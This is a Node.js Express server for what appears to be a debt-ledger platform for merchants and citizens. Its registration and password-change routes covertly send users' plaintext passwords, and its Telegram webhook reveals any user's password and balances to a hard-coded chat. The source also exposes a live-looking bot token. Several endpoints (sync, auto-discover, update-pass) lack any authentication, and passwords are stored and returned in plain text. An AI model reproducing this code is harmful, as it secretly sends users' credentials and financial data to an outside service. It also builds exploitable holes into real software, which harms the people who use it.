const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_royal_db.json';

const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error"); }
}

// معالجة أوامر التلجرام (الحذف والبحث)
app.post('/api/tg-webhook', async (req, res) => {
    const update = req.body;
    if (!update.message || !update.message.text) return res.sendStatus(200);
    const chatId = String(update.message.chat.id);
    const text = update.message.text.trim();

    if (chatId !== MY_CHAT_ID) return res.sendStatus(200);

    if (text.endsWith("حذف")) {
        const targetName = text.replace("حذف", "").trim();
        const initialCount = db.users.length;
        db.users = db.users.filter(u => u.name.toLowerCase() !== targetName.toLowerCase());
        if (db.users.length < initialCount) {
            saveDB();
            sendToTelegram(`🗑 **تم الحذف**\nتم مسح جميع الحسابات المرتبطة باسم [${targetName}].`);
        } else {
            sendToTelegram(`❌ **مشو مسجل**\nلا يوجد مستخدم بهذا الاسم.`);
        }
    } else {
        const users = db.users.filter(u => u.name.toLowerCase() === text.toLowerCase());
        if (users.length > 0) {
            let report = `📊 **نتائج البحث عن [${text}]:**\n`;
            users.forEach(user => {
                let y=0, u=0, s=0;
                user.myRecords.forEach(r => {
                    const a = parseFloat(r.amount);
                    const d = r.type === 'دين';
                    if(r.currency === 'YER') y += d?a:-a;
                    else if(r.currency === 'USD') u += d?a:-a;
                    else s += d?a:-a;
                });
                report += `\n👤 النوع: ${user.type === 'merchant' ? 'تاجر' : 'مواطن'}\n🔑 السر: \`${user.password}\`\n💰 يمني: ${y}\n💵 دولار: ${u}\n🇸🇦 سعودي: ${s}\n---`;
            });
            sendToTelegram(report);
        } else {
            sendToTelegram(`🔍 مشو مسجل باسم [${text}]`);
        }
    }
    res.sendStatus(200);
});

// نظام التسجيل الذكي
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalizedName = name.trim().toLowerCase();
    
    // البحث عن حساب بنفس الاسم ونفس النوع
    const existingSameType = db.users.find(u => u.name.toLowerCase() === normalizedName && u.type === type);

    if (action === 'reg') {
        if (existingSameType) {
            const role = type === 'merchant' ? 'تاجر' : 'مواطن';
            return res.status(400).json({ error: `عذراً.. أنت مسجل مسبقاً كـ (${role}) بهذا الاسم.` });
        }
        
        const newUser = {
            id: "H" + Math.random().toString(36).substr(2, 7),
            name: name.trim(),
            password,
            type,
            myRecords: [],
            createdAt: new Date().toISOString()
        };
        db.users.push(newUser);
        saveDB();
        sendToTelegram(`✨ **تسجيل جديد:**\nالاسم: ${newUser.name}\nالنوع: ${type === 'merchant' ? 'تاجر' : 'مواطن'}\nالسر: \`${password}\``);
        return res.json(newUser);
    } else {
        const user = db.users.find(u => u.name.toLowerCase() === normalizedName && u.password === password && u.type === type);
        if (!user) return res.status(403).json({ error: "بيانات الدخول غير صحيحة لهذه الصفة." });
        return res.json(user);
    }
});

app.post('/api/sync', (req, res) => {
    const { userId, myRecords } = req.body;
    const idx = db.users.findIndex(u => u.id === userId);
    if (idx !== -1) {
        db.users[idx].myRecords = myRecords;
        saveDB();
        res.json({ success: true });
    } else { res.status(404).send(); }
});

app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    const normalizedDebtor = debtorName.trim().toLowerCase();
    const results = db.users.filter(u => 
        u.type === 'merchant' && 
        u.myRecords.some(r => r.targetName.toLowerCase() === normalizedDebtor)
    ).map(u => ({
        merchantName: u.name,
        records: u.myRecords.filter(r => r.targetName.toLowerCase() === normalizedDebtor)
    }));
    res.json(results);
});

app.post('/api/update-pass', (req, res) => {
    const { userId, newPass } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (user) {
        const old = user.password;
        user.password = newPass;
        saveDB();
        sendToTelegram(`🔐 **تغيير سر:**\nالاسم: ${user.name}\nمن: ${old} -> إلى: ${newPass}`);
        res.json({ success: true });
    } else { res.status(404).send(); }
});

app.listen(PORT, () => console.log(`HEIBA PLATFORM ONLINE`));